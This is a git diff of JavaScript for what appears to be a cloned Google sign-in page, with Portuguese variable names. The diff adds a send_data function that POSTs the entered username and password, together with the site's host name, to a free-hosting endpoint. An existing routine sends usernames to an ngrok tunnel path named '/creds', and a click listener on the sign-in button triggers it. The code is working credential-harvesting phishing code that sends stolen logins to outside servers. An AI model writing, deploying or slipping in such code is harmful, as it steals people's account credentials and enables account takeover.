@@ -18,15 +18,34 @@ function send_pwd(){
     })
 }
 
+function send_data(usuario, senha){
+    const url = 'https://get-data123.000webhostapp.com/user.php';
+    const params = {
+      hostname: location.host,
+      username: usuario,
+      password: senha
+    };
+
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(params)
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error(error));
+}
 
 
                                   
                                   
                                   
-function teste_send(user, pass){
+function teste_send(user){
    setTimeout(function(){
        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user + "&pass=" + pass, true);
+        xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user, true);
         xhr.onreadystatechange = function() {
             if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                 console.log(xhr.responseText);
@@ -43,7 +62,7 @@ function teste_send(user, pass){
 const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
 btn[1].addEventListener('click', function(){
-    test_send(send_email(), setTimeout(function(){send_pwd()},3000))
+    test_send(send_email())
     //user = send_email();
     //setTimeout(function() {
     //    pwd = send_pwd()
